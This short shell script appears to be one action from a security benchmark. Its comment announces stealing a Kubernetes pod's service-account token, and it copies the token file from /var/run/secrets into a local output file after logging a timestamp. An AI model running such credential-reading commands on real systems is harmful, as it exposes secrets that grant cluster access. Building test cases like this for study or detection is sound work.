#!/bin/sh
# Steal the pod's Kubernetes service-account token (its account has no RBAC).
mkdir -p /tmp/bench || exit 1
echo "BENCH_ACTION $(date +%s%3N)"
cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/bench/12.out
